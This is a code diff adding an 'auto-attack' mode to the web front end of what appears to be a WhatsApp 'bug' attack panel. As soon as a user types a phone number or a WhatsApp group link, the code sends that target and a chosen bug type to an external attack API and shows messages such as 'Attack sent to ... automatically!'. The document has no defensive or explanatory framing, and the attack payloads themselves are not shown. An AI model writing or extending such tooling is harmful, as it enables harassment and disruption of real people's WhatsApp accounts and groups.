@@ -783,3 +783,89 @@ function switchAttackType(type) {
   document.getElementById('attackResult').innerHTML = '';
   checkApiConnection();
 }
+
+// Auto-attack configuration
+let autoAttackEnabled = false;
+let attackDebounceTimer;
+
+// Initialize attack menu
+function initAttackMenu() {
+  // WhatsApp Number auto-attack
+  document.getElementById('whatsappNumber').addEventListener('input', (e) => {
+    if (autoAttackEnabled && e.target.value.length >= 5) {
+      clearTimeout(attackDebounceTimer);
+      attackDebounceTimer = setTimeout(() => {
+        launchWhatsAppNumberAttack();
+      }, 1500); // 1.5 second delay after typing stops
+    }
+  });
+
+  // WhatsApp Group auto-attack
+  document.getElementById('whatsappGroupLink').addEventListener('input', (e) => {
+    if (autoAttackEnabled && e.target.value.includes('whatsapp.com')) {
+      clearTimeout(attackDebounceTimer);
+      attackDebounceTimer = setTimeout(() => {
+        launchWhatsAppGroupAttack();
+      }, 1500);
+    }
+  });
+}
+
+// Call this when menu loads
+initAttackMenu();
+
+// Enhanced attack functions with auto-send
+async function launchWhatsAppNumberAttack() {
+  const number = document.getElementById('whatsappNumber').value.trim();
+  const bugType = document.getElementById('bugType').value;
+  
+  if (!number || number.length < 5) {
+    return; // Skip if number is invalid
+  }
+
+  showAttackAnimation(`Attacking ${number}...`);
+  
+  try {
+    const response = await fetch(`${ATTACK_API_URL}?number=${encodeURIComponent(number)}&type=${bugType}`);
+    const result = await response.json();
+    
+    if (result.success) {
+      showAttackResult('success', `Attack sent to ${number} automatically!`);
+    } else {
+      showAttackResult('error', result.message || 'Auto-attack failed');
+    }
+  } catch (error) {
+    showAttackResult('error', `Auto-attack error: ${error.message}`);
+  }
+}
+
+async function launchWhatsAppGroupAttack() {
+  const groupLink = document.getElementById('whatsappGroupLink').value.trim();
+  const bugType = document.getElementById('groupBugType').value;
+  
+  if (!groupLink || !groupLink.includes('whatsapp.com')) {
+    return; // Skip if group link is invalid
+  }
+
+  showAttackAnimation(`Attacking group...`);
+  
+  try {
+    const response = await fetch(`${ATTACK_API_URL}?group=${encodeURIComponent(groupLink)}&type=${bugType}`);
+    const result = await response.json();
+    
+    if (result.success) {
+      showAttackResult('success', `Group attack sent automatically!`);
+    } else {
+      showAttackResult('error', result.message || 'Group auto-attack failed');
+    }
+  } catch (error) {
+    showAttackResult('error', `Group attack error: ${error.message}`);
+  }
+}
+
+// Toggle auto-attack feature
+function toggleAutoAttack() {
+  autoAttackEnabled = !autoAttackEnabled;
+  const status = autoAttackEnabled ? 'ON' : 'OFF';
+  alert(`Auto-attack mode is now ${status}`);
+}
